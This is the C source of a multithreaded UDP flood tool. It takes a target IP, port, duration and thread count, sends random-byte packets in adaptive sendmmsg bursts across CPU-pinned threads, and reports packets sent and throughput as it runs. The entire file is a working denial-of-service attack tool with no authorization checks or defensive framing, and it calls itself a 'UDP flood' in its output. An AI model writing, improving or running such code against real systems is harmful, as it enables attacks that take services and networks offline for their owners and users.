#define _GNU_SOURCE  // Required for CPU affinity and sendmmsg
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <stdatomic.h>
#include <signal.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

#define MIN(a, b) ((a) < (b) ? (a) : (b))
#define MAX(a, b) ((a) > (b) ? (a) : (b))
#define DEFAULT_PAYLOAD_SIZE 1024         // Default payload size
#define STATS_INTERVAL 1                  // Print stats every second
#define DEFAULT_MIN_BURST 10              // Minimum burst size
#define DEFAULT_MAX_BURST 1000            // Maximum burst size
#define DEFAULT_START_BURST 50            // Starting burst size
#define DEFAULT_BURST_STEP 10             // Burst adjustment step size

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int cpu_id;              // CPU core to bind this thread to
    int payload_size;        // Configurable payload size
    int min_burst_size;      // Minimum burst size
    int max_burst_size;      // Maximum burst size
    int current_burst;       // Current dynamic burst size
    int burst_adjust_step;   // How much to adjust burst each time
} thread_args;

_Atomic long total_sent = 0;
_Atomic long total_errors = 0;
volatile sig_atomic_t running = 1;

void int_handler(int sig) {
    running = 0;
}

void generate_payload(char *buffer, size_t size) {
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (!urandom || fread(buffer, 1, size, urandom) != size) {
        perror("Payload generation failed");
        exit(EXIT_FAILURE);
    }
    fclose(urandom);
}

void *send_payload(void *arg) {
    thread_args *args = (thread_args *)arg;
    char *payload = malloc(args->payload_size);
    struct sockaddr_in target_addr;
    int sockfd;
    time_t start_time;
    time_t last_adjust_time = 0;
    long last_sent_count = 0;

    if (!payload) {
        perror("Payload buffer allocation failed");
        pthread_exit(NULL);
    }

    // Bind thread to a specific CPU core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(args->cpu_id, &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np failed");
    }

    generate_payload(payload, args->payload_size);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        free(payload);
        pthread_exit(NULL);
    }

    // Socket optimizations
    int buf_size = 1024 * 1024;  // 1MB buffer
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    setsockopt(sockfd, IPPROTO_IP, IP_TOS, &(int){0x10}, sizeof(int)); // Higher priority

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    if (inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sockfd);
        free(payload);
        pthread_exit(NULL);
    }

    start_time = time(NULL);
    while (running && (time(NULL) - start_time < args->duration)) {
        // Allocate messages dynamically based on current burst size
        struct mmsghdr *msgs = calloc(args->current_burst, sizeof(struct mmsghdr));
        struct iovec *iovecs = calloc(args->current_burst, sizeof(struct iovec));
        
        if (!msgs || !iovecs) {
            perror("Message allocation failed");
            free(msgs);
            free(iovecs);
            break;
        }

        // Prepare messages
        for (int i = 0; i < args->current_burst; i++) {
            iovecs[i].iov_base = payload;
            iovecs[i].iov_len = args->payload_size;
            msgs[i].msg_hdr.msg_iov = &iovecs[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
            msgs[i].msg_hdr.msg_name = &target_addr;
            msgs[i].msg_hdr.msg_namelen = sizeof(target_addr);
        }

        // Send burst
        int ret = sendmmsg(sockfd, msgs, args->current_burst, 0);
        free(msgs);
        free(iovecs);

        if (ret < 0) {
            atomic_fetch_add(&total_errors, args->current_burst);
            // On error, reduce burst size aggressively
            args->current_burst = MAX(args->min_burst_size, 
                                    args->current_burst - (args->burst_adjust_step * 2));
        } else {
            atomic_fetch_add(&total_sent, ret);
            
            // Adjust burst size periodically (e.g., every second)
            time_t now = time(NULL);
            if (now - last_adjust_time >= 1) {
                long current_sent = atomic_load(&total_sent);
                long sent_since_last = current_sent - last_sent_count;
                last_sent_count = current_sent;
                last_adjust_time = now;

                // If we're sending successfully, try increasing burst
                if (ret == args->current_burst) {
                    args->current_burst = MIN(args->max_burst_size, 
                                            args->current_burst + args->burst_adjust_step);
                }
                // If we're not sending full bursts, decrease
                else if (ret < args->current_burst) {
                    args->current_burst = MAX(args->min_burst_size, 
                                            args->current_burst - args->burst_adjust_step);
                }
            }
        }
    }

    close(sockfd);
    free(payload);
    pthread_exit(NULL);
}

void print_stats(int duration) {
    time_t start = time(NULL);
    long last_sent = 0;
    
    while (running) {
        sleep(STATS_INTERVAL);
        int elapsed = (int)(time(NULL) - start);
        int remaining = duration - elapsed;
        
        long current_sent = atomic_load(&total_sent);
        long current_errors = atomic_load(&total_errors);
        long sent_since_last = current_sent - last_sent;
        last_sent = current_sent;
        
        // Calculate Mbps (assuming 8 bits per byte + UDP/IP headers)
        double mbps = (sent_since_last * (8.0 * (DEFAULT_PAYLOAD_SIZE + 28))) / (1024 * 1024);
        
        printf("\r[%02d:%02d] Packets: %ld (%.2f Mbps)  Errors: %ld  ",
               remaining / 60, remaining % 60,
               current_sent, mbps, current_errors);
        fflush(stdout);
        if (elapsed >= duration)
            running = 0;
    }
}

int main(int argc, char *argv[]) {
    if (argc < 5 || argc > 9) {
        printf("Usage: %s <IP> <PORT> <DURATION_SECONDS> <THREADS> [PAYLOAD_SIZE] [MIN_BURST] [MAX_BURST] [BURST_STEP]\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 4 1024 10 1000 10\n", argv[0]);
        return EXIT_FAILURE;
    }

    struct sigaction sa = { .sa_handler = int_handler };
    sigaction(SIGINT, &sa, NULL);

    char target_ip[16];
    strncpy(target_ip, argv[1], 15);
    target_ip[15] = '\0';
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    
    // Optional parameters with defaults
    int payload_size = (argc > 5) ? atoi(argv[5]) : DEFAULT_PAYLOAD_SIZE;
    int min_burst = (argc > 6) ? atoi(argv[6]) : DEFAULT_MIN_BURST;
    int max_burst = (argc > 7) ? atoi(argv[7]) : DEFAULT_MAX_BURST;
    int start_burst = (argc > 8) ? atoi(argv[8]) : DEFAULT_START_BURST;
    int burst_step = (argc > 9) ? atoi(argv[9]) : DEFAULT_BURST_STEP;

    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    thread_args *args = malloc(thread_count * sizeof(thread_args));
    if (!threads || !args) {
        perror("Memory allocation failed");
        free(threads);
        free(args);
        return EXIT_FAILURE;
    }

    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    for (int i = 0; i < thread_count; i++) {
        strncpy(args[i].target_ip, target_ip, 15);
        args[i].target_ip[15] = '\0';
        args[i].target_port = target_port;
        args[i].duration = duration;
        args[i].cpu_id = i % num_cpus;  // Distribute threads across CPUs
        args[i].payload_size = payload_size;
        args[i].min_burst_size = min_burst;
        args[i].max_burst_size = max_burst;
        args[i].current_burst = start_burst;
        args[i].burst_adjust_step = burst_step;

        if (pthread_create(&threads[i], NULL, send_payload, &args[i]) != 0) {
            perror("Thread creation failed");
            running = 0;
            for (int j = 0; j < i; j++) {
                pthread_join(threads[j], NULL);
            }
            free(threads);
            free(args);
            return EXIT_FAILURE;
        }
    }

    printf("Starting UDP flood to %s:%d for %d seconds using %d threads\n",
           target_ip, target_port, duration, thread_count);
    printf("Payload size: %d bytes | Burst range: %d-%d | Start burst: %d | Step: %d\n",
           payload_size, min_burst, max_burst, start_burst, burst_step);

    print_stats(duration);

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\nFinal results:\n");
    printf("Total packets sent: %ld\n", atomic_load(&total_sent));
    printf("Total errors: %ld\n", atomic_load(&total_errors));
    
    // Calculate total throughput
    double total_mbps = (atomic_load(&total_sent) * (8.0 * (payload_size + 28))) / (1024 * 1024 * duration);
    printf("Average throughput: %.2f Mbps\n", total_mbps);

    free(threads);
    free(args);
    return EXIT_SUCCESS;
}